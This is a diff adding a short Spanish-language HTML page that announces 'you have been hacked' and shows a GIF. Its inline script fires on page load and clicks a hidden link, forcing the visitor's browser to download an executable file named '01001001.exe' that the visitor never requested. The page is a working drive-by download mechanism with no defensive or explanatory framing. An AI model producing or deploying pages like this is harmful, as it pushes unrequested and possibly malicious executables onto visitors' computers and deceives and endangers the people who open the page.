@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Usted ha sido hackeado</title>
+    <link rel="stylesheet" href="styles.css">
+    <script>
+        // Espera a que la página se cargue
+        window.onload = function() {
+            // Crear un enlace temporal para la descarga
+            const link = document.createElement('a');
+            link.href = 'txt/01001001.exe'; // Ruta al archivo que se va a descargar
+            link.download = 'txt/01001001.exe'; // Nombre del archivo con el que se descargará
+            link.click(); // Simula un clic en el enlace para iniciar la descarga
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>Has sido hackeado</h1>
+        <div class="gif-container">
+            <img src="IMG/KB6s.gif" alt="GIF local">
+        </div>
+    </div>
+</body>
+</html>
